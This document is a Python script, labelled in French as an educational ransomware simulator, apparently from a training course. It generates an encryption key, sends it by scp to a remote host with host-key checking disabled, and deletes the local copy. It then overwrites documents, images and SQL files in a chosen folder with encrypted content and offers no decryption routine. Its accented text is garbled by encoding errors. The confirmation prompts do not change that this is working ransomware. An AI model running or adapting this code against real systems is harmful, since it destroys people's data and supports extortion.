#!/usr/bin/env python3
# RANSOMWARE SIMULATEUR - VERSION AM√âLIOR√âE AVEC CONTR√îLES DE S√âCURIT√â
import os
import sys
import subprocess
from cryptography.fernet import Fernet
from pathlib import Path
from datetime import datetime

# Configuration
SSH_SERVER = "192.168.45.90"
SSH_USER = "doranco"
REMOTE_DIR = "/home/doranco/Desktop/script/cle_dechiffrement"
KEY_FILE = "decryption_key.key"
LOG_FILE = "ransomware_simulator.log"

class RansomwareSimulator:
    def __init__(self):
        self.key = None
        self.cipher = None
        self.target_exts = {'.txt', '.doc', '.docx', '.pdf', '.jpg', '.sql'}
        
    def log_action(self, message):
        """Journalise toutes les actions importantes"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        with open(LOG_FILE, 'a') as f:
            f.write(log_entry)
        print(message)

    def clear_screen(self):
        """Efface l'√©cran du terminal"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def show_banner(self):
        """Affiche une banni√®re stylis√©e"""
        self.clear_screen()
        print("""
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ïë
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë
‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ïö‚ïê‚ïù ‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù
        """)
        print("=== SIMULATEUR √âDUCATIF - MENU PRINCIPAL ===")
        print("‚ö†Ô∏è √Ä utiliser uniquement en environnement de test ‚ö†Ô∏è\n")

    def confirm_action(self, message):
        """Demande une confirmation avant une action critique"""
        print(f"\n‚ö†Ô∏è {message} ‚ö†Ô∏è")
        return input("Confirmer (o/n): ").lower() == 'o'

    def generate_key(self):
        """G√©n√®re une cl√© de chiffrement"""
        if not self.confirm_action("Cela g√©n√©rera une nouvelle cl√© de chiffrement. Continuer?"):
            return False

        self.log_action("üîë Tentative de g√©n√©ration de cl√©...")
        try:
            self.key = Fernet.generate_key()
            self.cipher = Fernet(self.key)
            self.log_action(f"‚úÖ Cl√© g√©n√©r√©e: {self.key.decode()[:12]}... (tronqu√©e pour s√©curit√©)")
            return True
        except Exception as e:
            self.log_action(f"‚ùå Erreur lors de la g√©n√©ration de cl√©: {e}")
            return False

    def transfer_key_ssh(self):
        """Transf√®re la cl√© via SSH natif"""
        if not self.key:
            self.log_action("‚ùå Aucune cl√© g√©n√©r√©e!")
            return False

        if not self.confirm_action(f"Transf√©rer la cl√© vers {SSH_SERVER}? Cela supprimera la copie locale apr√®s transfert."):
            return False

        try:
            self.log_action("üîÑ Transfert de la cl√© en cours...")
            
            # Cr√©e un fichier temporaire
            with open(KEY_FILE, 'wb') as f:
                f.write(self.key)
            
            # Test la connexion SSH
            subprocess.run(['ssh', f'{SSH_USER}@{SSH_SERVER}', 'true'], check=True)
            
            # Cr√©e le r√©pertoire distant
            subprocess.run([
                'ssh',
                f'{SSH_USER}@{SSH_SERVER}',
                f'mkdir -p {REMOTE_DIR}'
            ], check=True)
            
            # Copie la cl√© via SCP
            subprocess.run([
                'scp',
                '-o', 'StrictHostKeyChecking=no',
                KEY_FILE,
                f'{SSH_USER}@{SSH_SERVER}:{REMOTE_DIR}/{KEY_FILE}'
            ], check=True)
            
            # V√©rification du transfert
            result = subprocess.run([
                'ssh',
                f'{SSH_USER}@{SSH_SERVER}',
                f'ls {REMOTE_DIR}/{KEY_FILE}'
            ], capture_output=True, text=True)
            
            if result.returncode != 0:
                raise Exception("√âchec de la v√©rification du transfert")
            
            # Nettoyage s√©curis√©
            os.remove(KEY_FILE)
            
            self.log_action(f"üì§ Cl√© transf√©r√©e avec succ√®s vers {SSH_SERVER}:{REMOTE_DIR}/{KEY_FILE}")
            return True
            
        except subprocess.CalledProcessError as e:
            self.log_action(f"‚ùå √âchec du transfert SSH: {e}")
            if os.path.exists(KEY_FILE):
                self.log_action("‚ö†Ô∏è La cl√© est rest√©e locale dans: " + os.path.abspath(KEY_FILE))
            return False

    def encrypt_file(self, filepath):
        """Chiffre un fichier"""
        try:
            if Path(filepath).suffix.lower() not in self.target_exts:
                return False

            with open(filepath, 'rb') as f:
                data = f.read()
            
            encrypted = self.cipher.encrypt(data)
            
            with open(filepath, 'wb') as f:
                f.write(encrypted)
            
            self.log_action(f"üîí Fichier chiffr√©: {filepath}")
            return True
        except Exception as e:
            self.log_action(f"‚ö†Ô∏è Erreur sur {filepath}: {e}")
            return False

    def encrypt_directory(self, path='.'):
        """Chiffre un dossier"""
        if not os.path.exists(path):
            self.log_action("‚ùå Le dossier sp√©cifi√© n'existe pas!")
            return

        if not self.confirm_action(f"Cela chiffrera TOUS les fichiers cibles dans {path}. CONTINUER?"):
            return

        encrypted = errors = 0
        self.log_action(f"üîí D√©but du chiffrement de: {path}")
        
        for root, _, files in os.walk(path):
            for file in files:
                if Path(file).suffix.lower() in self.target_exts:
                    if self.encrypt_file(os.path.join(root, file)):
                        encrypted += 1
                    else:
                        errors += 1
        
        self.log_action(f"‚úÖ Chiffrement termin√© dans {path}!")
        self.log_action(f"   Fichiers chiffr√©s: {encrypted}")
        self.log_action(f"   Erreurs: {errors}")

    def show_menu(self):
        """Affiche le menu interactif"""
        while True:
            self.show_banner()
            print("Options disponibles:")
            print("1. G√©n√©rer une nouvelle cl√©")
            print("2. Transf√©rer la cl√© actuelle")
            print("3. Chiffrer un dossier")
            print("4. Tout faire (mode automatique)")
            print("5. Afficher le journal")
            print("0. Quitter\n")
            
            choice = input("Votre choix (0-5): ")
            
            if choice == "1":
                self.generate_key()
            elif choice == "2":
                if self.key:
                    self.transfer_key_ssh()
                else:
                    self.log_action("‚ùå Vous devez d'abord g√©n√©rer une cl√©!")
            elif choice == "3":
                if self.key:
                    path = input("\nEntrez le chemin du dossier √† chiffrer: ").strip()
                    self.encrypt_directory(path)
                else:
                    self.log_action("‚ùå Vous devez d'abord g√©n√©rer une cl√©!")
            elif choice == "4":
                self.log_action("\nüöÄ Mode automatique activ√©...")
                if self.generate_key():
                    if self.transfer_key_ssh():
                        path = input("\nEntrez le chemin du dossier √† chiffrer: ").strip()
                        self.encrypt_directory(path)
            elif choice == "5":
                self.show_log()
            elif choice == "0":
                self.log_action("\nüëã Au revoir!")
                sys.exit(0)
            else:
                self.log_action("\n‚ùå Option invalide!")
            
            input("\nAppuyez sur Entr√©e pour continuer...")

    def show_log(self):
        """Affiche le journal des actions"""
        self.clear_screen()
        print("=== JOURNAL D'ACTIVIT√â ===")
        
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                print(f.read())
        else:
            print("Aucune entr√©e de journal trouv√©e.")
        
        input("\nAppuyez sur Entr√©e pour retourner au menu...")

if __name__ == '__main__':
    try:
        # V√©rifie que SSH est install√©
        subprocess.run(['ssh', '-V'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        
        sim = RansomwareSimulator()
        sim.log_action("=== D√âMARRAGE DU SIMULATEUR ===")
        sim.show_menu()
        
    except subprocess.CalledProcessError:
        print("\n‚ùå Erreur: OpenSSH doit √™tre install√©")
        print("Installez-le avec: sudo apt install openssh-client")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n\n‚èπÔ∏è Op√©ration annul√©e par l'utilisateur")
        sys.exit(0)
    except Exception as e:
        print(f"\n‚ùå Erreur inattendue: {e}")
        sys.exit(1)